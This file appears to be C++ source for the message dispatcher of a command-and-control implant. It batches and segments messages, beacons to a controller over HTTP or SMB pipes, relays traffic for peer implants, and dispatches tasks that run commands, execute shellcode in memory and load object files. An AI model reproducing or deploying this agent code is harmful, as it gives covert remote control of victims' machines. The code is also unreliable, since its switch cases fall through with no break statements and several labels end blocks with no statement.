#include <core/include/dispatch.hpp>
namespace Dispatcher {

    BOOL PeekPID(const _stream *const stream) {
        HEXANE

        uint32_t pid = 0;
        x_memcpy(&pid, stream->Buffer, 4);

        if (x_memcmp(&Ctx->Session.PeerId, &pid, 4) == 0) {
            return TRUE;
        }

        return FALSE;
    }

    VOID AddMessage(_stream *const out) {
        HEXANE

        _stream *head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = out;
        } else {
            while (head->Next) {
                head = head->Next;
            }

            head->Next = out;
        }
    }

    VOID ClearQueue() {
        HEXANE

        _stream *head = Ctx->Transport.OutboundQueue;
        _stream *swap = { };
        _stream *prev = { };

        if (!head) {
            Ctx->Transport.OutboundQueue = nullptr;
            return;
        }

        while (head) {
            if (head->Ready) {
                if (prev) {
                    prev->Next = head->Next;

                } else {
                    Ctx->Transport.OutboundQueue = head->Next;
                }
                swap = head;
                head = head->Next;

                Stream::DestroyStream(swap);

            } else {
                prev = head;
                head = head->Next;
            }
        }
    }

    VOID OutboundQueue(_stream *const out) {
        HEXANE

        _parser parser = { };
        _stream *queue = { };

        if (!out) {
            return_defer(ERROR_NO_DATA);
        }

        if (out->Length > MESSAGE_MAX) {
            QueueSegments(B_PTR(out->Buffer), out->Length);

        } else {
            Parser::CreateParser(&parser, B_PTR(out->Buffer), out->Length);

            queue           = Stream::CreateStream();
            queue->PeerId   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->TaskId   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->MsgType  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));

            queue->Length   = parser.Length;
            queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, queue->Buffer, queue->Length);

            x_memcpy(queue->Buffer, parser.Buffer, queue->Length);
            AddMessage(queue);

            Parser::DestroyParser(&parser);
            Stream::DestroyStream(out);
        }

        defer:
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
        HEXANE

        _stream *queue = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (length > 0) {
            cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
                ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
                : length;

            queue = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            queue->PeerId    = peer_id;
            queue->TaskId    = task_id;
            queue->MsgType   = TypeSegment;

            Stream::PackDword(queue, index);
            Stream::PackDword(queue, n_seg);
            Stream::PackDword(queue, cb_seg);
            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            index++;
            length -= cb_seg;
            offset += cb_seg;

            AddMessage(queue);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        _stream *out    = Stream::CreateStream();
        _stream *in     = { };
        _stream *head   = { };
        _stream *swap   = { };
        _parser parser  = { };

        retry:
        if (!Ctx->Transport.OutboundQueue) {

#if defined(TRANSPORT_SMB)
            return_defer(ERROR_SUCCESS);
#elif defined(TRANSPORT_HTTP)
            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);

            OutboundQueue(entry);
            goto retry;
#endif

        } else {
            head = Ctx->Transport.OutboundQueue;

            while (head) {
                if (!head->Ready) {
                    if (head->Length + MESSAGE_HEADER_SIZE + out->Length > MESSAGE_MAX) {
                        break;
                    }

                    if (head->Buffer) {
                        Parser::CreateParser(&parser, B_PTR(head->Buffer), head->Length);

                        Stream::PackDword(out, head->PeerId);
                        Stream::PackDword(out, head->TaskId);
                        Stream::PackDword(out, head->MsgType);

                        if (Ctx->Root) {
                            Stream::PackBytes(out, B_PTR(head->Buffer), head->Length);

                        } else {
                            out->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, out->Buffer, out->Length + head->Length);
                            x_memcpy(B_PTR(out->Buffer) + out->Length, head->Buffer, head->Length);

                            out->Length += head->Length;
                        }
                    } else {
                        return_defer(ERROR_NO_DATA);
                    }
                    head->Ready = TRUE;
                }
                head = head->Next;
            }
        }

#ifdef TRANSPORT_HTTP
        Network::Http::HttpCallback(out, &in);
#endif
#ifdef TRANSPORT_PIPE
        Network::Smb::PeerConnectEgress(out, &in);
#endif

        Stream::DestroyStream(out);
        out = nullptr;

        if (in) {
            //todo: do not clear the queue, just remove n entries
            ClearQueue();

            if (PeekPID(in)) {
                CommandDispatch(in);
                Stream::DestroyStream(in);

            } else {
                swap = in;
                in = out;
                out = swap;

                if (Ctx->Config.IngressPipename) {
                    Network::Smb::PeerConnectIngress(out, &in);

                    if (in) {
                        OutboundQueue(in);
                    }
                }
                Stream::DestroyStream(out);
            }
        } else {
            head = Ctx->Transport.OutboundQueue;
            while (head) {
                head->Ready = FALSE;
                head = head->Next;
            }
        }

    defer:
    }

    VOID CommandDispatch (const _stream *const in) {
        HEXANE

        _parser parser = { };

        Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
        Parser::UnpackDword(&parser); // throw-away pid todo: maybe generate new pid every task?

        Ctx->Session.CurrentTaskId = Parser::UnpackDword(&parser);

        auto msg_type = Parser::UnpackDword(&parser);
        switch (msg_type) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
            }
            case TypeTasking: {
                Memory::Execute::ExecuteCommand(parser);
            }
            case TypeExecute: {
                Memory::Execute::ExecuteShellcode(parser);
            }
            case TypeObject: {
                // load a BOF file
                Injection::LoadObject(parser);
            }

            default:
                break;
        }

        Parser::DestroyParser(&parser);
    }
}